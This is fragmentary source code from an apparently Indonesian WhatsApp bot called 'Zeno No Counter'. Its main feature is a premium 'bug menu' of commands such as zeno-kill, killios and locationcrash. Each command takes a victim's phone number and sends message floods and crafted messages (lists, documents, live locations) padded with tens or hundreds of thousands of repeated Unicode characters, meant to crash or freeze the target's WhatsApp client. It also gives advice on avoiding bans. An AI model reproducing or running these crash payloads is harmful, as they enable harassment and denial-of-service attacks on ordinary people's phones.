...
const anjay = fs.readFileSync(`./zeno/anjay.jpg`)
const qris = fs.readFileSync(`./zeno/qris.jpg`)
...
message: {
listResponseMessage: {
title: `Z̟̈́̆̉͜ẹ̿͋̒̕ṇ̤͛̒̍o̯̱̊͊͢ N̺̻̔̆ͅo̯̱̊͊͢ C̵͉͋̔͞o̯̱̊͊͢ư̡͕̭̇ṇ̤͛̒̍t̲̂̓ͩ̑ẹ̿͋̒̕r̴̨̦͕̝ `
}
}
}
...
async function listfuck(target, kuwoted) {
 var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
  'listMessage': {
    'title': "ジンクスバグ 𝐙𝐞𝐧𝐨 𝐍𝐨 𝐂𝐨𝐮𝐧𝐭𝐞𝐫"+" ".repeat(920000),
        'footerText': `ジンクスバグ 𝐙𝐞𝐧𝐨 𝐍𝐨 𝐂𝐨𝐮𝐧𝐭𝐞𝐫 ジンクスバグ 𝐙𝐞𝐧𝐨 𝐍𝐨 𝐂𝐨𝐮𝐧𝐭𝐞𝐫 ジンクスバグ 𝐙𝐞𝐧𝐨 𝐍𝐨 𝐂𝐨𝐮𝐧𝐭𝐞𝐫 ジンクスバグ 𝐙𝐞𝐧𝐨 𝐍𝐨 𝐂𝐨𝐮𝐧𝐭𝐞𝐫 ジンクスバグ 𝐙𝐞𝐧𝐨 𝐍𝐨 𝐂𝐨𝐮𝐧𝐭𝐞𝐫 ジンクスバグ 𝐙𝐞𝐧𝐨 𝐍𝐨 𝐂𝐨𝐮𝐧𝐭𝐞𝐫 ジンクスバグ 𝐙𝐞𝐧𝐨 𝐍𝐨 𝐂𝐨𝐮𝐧𝐭𝐞𝐫`,
        'description': `ジンクスバグ 𝐙𝐞𝐧𝐨 𝐍𝐨 𝐂𝐨𝐮𝐧𝐭𝐞𝐫 ジンクスバグ 𝐙𝐞𝐧𝐨 𝐍𝐨 𝐂𝐨𝐮𝐧𝐭𝐞𝐫 ジンクスバグ 𝐙𝐞𝐧𝐨 𝐍𝐨 𝐂𝐨𝐮𝐧𝐭𝐞𝐫 ジンクスバグ 𝐙𝐞𝐧𝐨 𝐍𝐨 𝐂𝐨𝐮𝐧𝐭𝐞𝐫 ジンクスバグ 𝐙𝐞𝐧𝐨 𝐍𝐨 𝐂𝐨𝐮𝐧𝐭𝐞𝐫 ジンクスバグ 𝐙𝐞𝐧𝐨 𝐍𝐨 𝐂𝐨𝐮𝐧𝐭𝐞𝐫 ジンクスバグ 𝐙𝐞𝐧𝐨 𝐍𝐨 𝐂𝐨𝐮𝐧𝐭𝐞𝐫`,
        'buttonText': null,
        'listType': 2,
        'productListInfo': {
          'productSections': [{
      ...
      'message': {
        'interactiveMessage': {
          ...
          'nativeFlowMessage': {
            'buttons': [{
              'name': 'cta_url',
              'buttonParamsJson': "{ display_text : '𝐙𝐞𝐧𝐨 𝐍𝐨 𝐂𝐨𝐮𝐧𝐭𝐞𝐫', url : , merchant_url :  }"
            }],
...
async function bakdok(target, kuwoted) {
 var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
  "documentMessage": {
    ...
    "fileName": `ZENO DOCUMENT`+"ྦྷ".repeat(60000),
...
message: {
  "liveLocationMessage": {
    "degreesLatitude": "p",
    "degreesLongitude": "p",
    "caption": `ジンクスバグ 𝐙𝐞𝐧𝐨 𝐍𝐨 𝐂𝐨𝐮𝐧𝐭𝐞𝐫 ジンクスバグ 𝐙𝐞𝐧𝐨 𝐍𝐨 𝐂𝐨𝐮𝐧𝐭𝐞𝐫 ジンクスバグ 𝐙𝐞𝐧𝐨 𝐍𝐨 𝐂𝐨𝐮𝐧𝐭𝐞𝐫 ジンクスバグ 𝐙𝐞𝐧𝐨 𝐍𝐨 𝐂𝐨𝐮𝐧𝐭𝐞𝐫 ジンクスバグ 𝐙𝐞𝐧𝐨 𝐍𝐨 𝐂𝐨𝐮𝐧𝐭𝐞𝐫 ジンクスバグ 𝐙𝐞𝐧𝐨 𝐍𝐨 𝐂𝐨𝐮𝐧𝐭𝐞𝐫 ジンクスバグ 𝐙𝐞𝐧𝐨 𝐍𝐨 𝐂𝐨𝐮𝐧𝐭𝐞𝐫 ジンクスバグ 𝐙𝐞𝐧𝐨 𝐍𝐨 𝐂𝐨𝐮𝐧𝐭𝐞𝐫`+"ꦾ".repeat(50000),
    "sequenceNumber": "0",
    "jpegThumbnail": ""
     }
  }
...
ʜᴀɪ, sᴀʏᴀ ᴀᴅᴀʟᴀʜ ᴢᴇɴᴏ ᴡʜᴀᴛsᴀᴘᴘ ᴀɪ ʏᴀɴɢ ᴅɪᴄɪᴘᴛᴀᴋᴀɴ ᴏʟᴇʜ 𝘿𝙧𝙖𝙮𝙓𝙙 𝙊𝙛𝙛𝙞𝙘𝙞𝙖𝙡 ᴜɴᴛᴜᴋ ᴍᴇᴍᴘᴇʀᴍᴜᴅᴀʜ ᴘᴇᴋᴇʀᴊᴀᴀɴ ᴍᴀɴᴜsɪᴀ
...
buttons: [{
"name": "single_select",
"buttonParamsJson": `{ "title": "𝔹𝕌𝔾 𝕄𝔼ℕ𝕌", "sections": [{ "title": "# Pilih Salah Satu Bug Menu Di Bawah Ini", "highlight_label": \"Powered By ${global.namaown}\", "rows": [{ "header": "𝙕𝙀𝙉𝙊 𝘽𝙐𝙂", "title": "Menampilkan fitur zeno bug", "id": ".zenobug" }, 
...
case 'zeno-attack': case 'zeno-1jam':  case 'zeno-war': case 'zeno1': case 'zeno4': case 'arara': {
if (!isPremium) return replyz(mess.premium)
...
case 'darkness':  case 'zeno-war': case 'zeno-marah': {
if (!isPremium) return replyz(mess.premium)
if (!text) return replyz(`Example: .${command} 628xxx`)
let peler = q.replace(/[^0-9]/g, "")
if (peler.startsWith('0')) return replyz(`\`[ # ]\` Masukan Nomor Awal Kode Negara\n\n\`[ # ]\` Example : .${command} 628xxx`)
...
await Zynxzoo.sendMessage(Pe, { document: virgam,  caption: `Z̟̈́̆̉͜ẹ̿͋̒̕ṇ̤͛̒̍o̯̱̊͊͢ N̺̻̔̆ͅo̯̱̊͊͢ C̵͉͋̔͞o̯̱̊͊͢ư̡͕̭̇ṇ̤͛̒̍t̲̂̓ͩ̑ẹ̿͋̒̕r̴̨̦͕̝  㐅 ` }, { quoted:m })
await sleep(500)
await Zynxzoo.sendMessage(Pe, { document: virgam,  caption: `Z̟̈́̆̉͜ẹ̿͋̒̕ṇ̤͛̒̍o̯̱̊͊͢ N̺̻̔̆ͅo̯̱̊͊͢ C̵͉͋̔͞o̯̱̊͊͢ư̡͕̭̇ṇ̤͛̒̍t̲̂̓ͩ̑ẹ̿͋̒̕r̴̨̦͕̝  㐅 ` }, { quoted:m })
await sleep(500)
await Zynxzoo.sendMessage(Pe, { document: virgam,  caption: `Z̟̈́̆̉͜ẹ̿͋̒̕ṇ̤͛̒̍o̯̱̊͊͢ N̺̻̔̆ͅo̯̱̊͊͢ C̵͉͋̔͞o̯̱̊͊͢ư̡͕̭̇ṇ̤͛̒̍t̲̂̓ͩ̑ẹ̿͋̒̕r̴̨̦͕̝  㐅 ` }, { quoted:m })
...
case 'slayer': case 'zeno-war': case 'zeno-kill': {
if (!isPremium) return replyz(mess.premium)
if (!text) return replyz(`Example: .${command} 628xxx`)
let peler = q.replace(/[^0-9]/g, "")
if (peler.startsWith('0')) return replyz(`\`[ # ]\` Masukan Nomor Awal Kode Negara\n\n\`[ # ]\` Example : .${command} 628xxx`)
...
await locationcrash(Pe, force)
await sendPaymentInfoMessage(Pe)
await Zynxzoo.sendMessage(Pe, { image: slayer,  caption: `Z̟̈́̆̉͜ẹ̿͋̒̕ṇ̤͛̒̍o̯̱̊͊͢ N̺̻̔̆ͅo̯̱̊͊͢ C̵͉͋̔͞o̯̱̊͊͢ư̡͕̭̇ṇ̤͛̒̍t̲̂̓ͩ̑ẹ̿͋̒̕r̴̨̦͕̝  ` }, { quoted:m })
await sleep(500)
await Zynxzoo.sendMessage(Pe, { image: slayer,  caption: `Z̟̈́̆̉͜ẹ̿͋̒̕ṇ̤͛̒̍o̯̱̊͊͢ N̺̻̔̆ͅo̯̱̊͊͢ C̵͉͋̔͞o̯̱̊͊͢ư̡͕̭̇ṇ̤͛̒̍t̲̂̓ͩ̑ẹ̿͋̒̕r̴̨̦͕̝  ` }, { quoted:m })
await sleep(500)
await Zynxzoo.sendMessage(Pe, { image: slayer,  caption: `Z̟̈́̆̉͜ẹ̿͋̒̕ṇ̤͛̒̍o̯̱̊͊͢ N̺̻̔̆ͅo̯̱̊͊͢ C̵͉͋̔͞o̯̱̊͊͢ư̡͕̭̇ṇ̤͛̒̍t̲̂̓ͩ̑ẹ̿͋̒̕r̴̨̦͕̝  ` }, { quoted:m })
...
await locationcrash(Pe, zynxzobug)
await sendPaymentInfoMessage(Pe)
Zynxzoo.sendMessage(Pe, {text: `\`𝐙𝐞𝐧𝐨 𝐍𝐨 𝐂𝐨𝐮𝐧𝐭𝐞𝐫\``}, {quoted: m})
await sleep(500)
Zynxzoo.sendMessage(Pe, {text: `\`𝐙𝐞𝐧𝐨 𝐍𝐨 𝐂𝐨𝐮𝐧𝐭𝐞𝐫\``}, {quoted: m})
await sleep(500)
Zynxzoo.sendMessage(Pe, {text: `\`𝐙𝐞𝐧𝐨 𝐍𝐨 𝐂𝐨𝐮𝐧𝐭𝐞𝐫\``}, {quoted: m})
...
case 'iphone': case 'xiphone': case 'zeno-kill':  case 'zeno5': case 'killios': {
if (!isPremium) return replyz(mess.premium)
if (!text) return replyz(`Example: .${command} 628xxx`)
let peler = q.replace(/[^0-9]/g, "")
if (peler.startsWith('0')) return replyz(`\`[ # ]\` Masukan Nomor Awal Kode Negara\n\n\`[ # ]\` Example : .${command} 628xxx`)
...
case 'anti-andro1': case 'anti-andro2': case 'zeno-war': case '😡': case 'zeno3': case 'anti-andro3': {
if (!isPremium) return replyz(mess.premium)
if (!text) return replyz(`Example: .${command} 628xxx`)
let peler = q.replace(/[^0-9]/g, "")
if (peler.startsWith('0')) return replyz(`\`[ # ]\` Masukan Nomor Awal Kode Negara\n\n\`[ # ]\` Example : .${command} 628xxx`)
...
await sleep(2000)
reply(`*✅ Zeno berhasil mengirim bug menggunakan ${command}*.\n\n Mohon beri jeda 4 menit agar bot tidak di banned..`)
break
...
case 'antigedor': case 'sodok-zeno': case 'vip-bug': case 'zeno-bantai': case 'wardek': {
if (!isPremium) return replyz(mess.premium)
if (!text) return replyz(`Usage .${command} 6281234567890`)
let peler = q.replace(/[^0-9]/g, '');
if (peler.startsWith('0')) return replyz(`Example : ${prefix+command} 6281234567890`)
...
case 'onlybug': case 'onekill': case 'doublekill': case 'bugzeno': case 'triplekill':  case 'maniac': case 'savage': {
if (!isPremium) return replyz(mess.premium)
if (!text) return replyz(`Example: .${command} 628xxx`)
let peler = q.replace(/[^0-9]/g, "")
if (peler.startsWith('0')) return replyz(`\`[ # ]\` Masukan Nomor Awal Kode Negara\n\n\`[ # ]\` Example : .${command} 628xxx`)
		...
		m.chat, {
			viewOnceMessage: {
				message: {
					interactiveMessage: {
						body: {
							text: (`HAI KAK ${pushname}\nINI BANG VRILZ XD YAA JNGAN DI SPAM`)
						},
						carouselMessage: {
							cards: [{
								header: {
								...
								nativeFlowMessage: {
									buttons: [{
										name: "cta_url",
										buttonParamsJson: '{"display_text":"Owner","url":"https:\\/\\/wa.me\\/628568352857?text=Halo+bg+VRILZ XD+ganteng","webview_presentation":null}',
									}, ],
								},
							}, {
								header: {
								...
								body: {
									text: `*Channel VRILZ XD*`
								},
								nativeFlowMessage: {
									buttons: [{
										name: "cta_url",
										buttonParamsJson: '{"display_text":"Channel","url":"https://whatsapp.com/channel/0029VaktvlhJpe8c5N3rNR1l","merchant_url":"https://www.google.com"}',
									}, ],
								},
							}, ],
							messageVersion: 1,
